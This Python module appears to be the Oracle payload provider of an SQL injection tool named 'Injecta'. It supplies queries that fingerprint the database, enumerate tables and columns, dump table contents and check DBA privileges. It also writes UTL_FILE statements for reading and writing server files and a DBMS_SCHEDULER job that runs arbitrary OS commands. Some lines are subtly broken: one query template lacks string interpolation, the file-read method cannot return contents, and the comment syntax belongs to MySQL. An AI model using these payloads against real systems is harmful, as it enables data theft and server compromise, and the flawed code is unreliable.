"""
Injecta — Oracle payload provider
"""
from typing import List


class OraclePayloads:
    name = "oracle"
    comment = "-- "
    inline_comment = "/*!*/"

    @staticmethod
    def version() -> List[str]:
        return [
            "SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'",
            "SELECT version FROM v$instance",
        ]

    @staticmethod
    def databases() -> List[str]:
        return [
            "SELECT name FROM v$database",
            "SELECT global_name FROM global_name",
        ]

    @staticmethod
    def tables(db: str) -> List[str]:
        return [
            "SELECT table_name FROM all_tables",
            "SELECT table_name FROM user_tables",
            "SELECT owner || '.' || table_name FROM all_tables WHERE owner='{db}'",
        ]

    @staticmethod
    def columns(db: str, table: str) -> List[str]:
        return [
            f"SELECT column_name FROM all_tab_columns WHERE table_name='{table.upper()}'",
            f"SELECT column_name FROM user_tab_columns WHERE table_name='{table.upper()}'",
        ]

    @staticmethod
    def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
        q = f"SELECT {column} FROM {table}"
        if limit > 0:
            q += f" WHERE ROWNUM <= {limit}"
        return [q]

    @staticmethod
    def current_user() -> List[str]:
        return ["SELECT USER FROM DUAL"]

    @staticmethod
    def current_db() -> List[str]:
        return ["SELECT ora_database_name FROM DUAL"]

    @staticmethod
    def count_tables(db: str) -> List[str]:
        return ["SELECT COUNT(*) FROM all_tables"]

    @staticmethod
    def count_columns(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM all_tab_columns WHERE table_name='{table.upper()}'"]

    @staticmethod
    def count_rows(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {table}"]

    @staticmethod
    def banner() -> List[str]:
        return ["SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'"]

    @staticmethod
    def is_admin() -> List[str]:
        return [
            "SELECT 1 FROM session_roles WHERE role='DBA'",
            "SELECT 1 FROM v$pwfile_users WHERE username=USER AND sysdba='TRUE'",
        ]

    @staticmethod
    def privileges() -> List[str]:
        return [
            "SELECT privilege FROM session_privs",
            "SELECT granted_role, admin_option FROM user_role_privs",
        ]

    @staticmethod
    def file_read(path: str) -> List[str]:
        return [
            f"SELECT UTL_FILE.FOPEN('{path}', 'r') FROM DUAL",
        ]

    @staticmethod
    def file_write(path: str, content: str) -> List[str]:
        escaped = content.replace("'", "''")
        return [
            f"DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('{path}', 'w'); UTL_FILE.PUT_LINE(f, '{escaped}'); UTL_FILE.FCLOSE(f); END;",
        ]

    @staticmethod
    def os_cmd(cmd: str) -> List[str]:
        escaped = cmd.replace("'", "''")
        return [
            f"DECLARE j NUMBER; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'INJECTA_JOB',job_type=>'EXECUTABLE',job_action=>'{escaped}',enabled=>TRUE); END;",
        ]
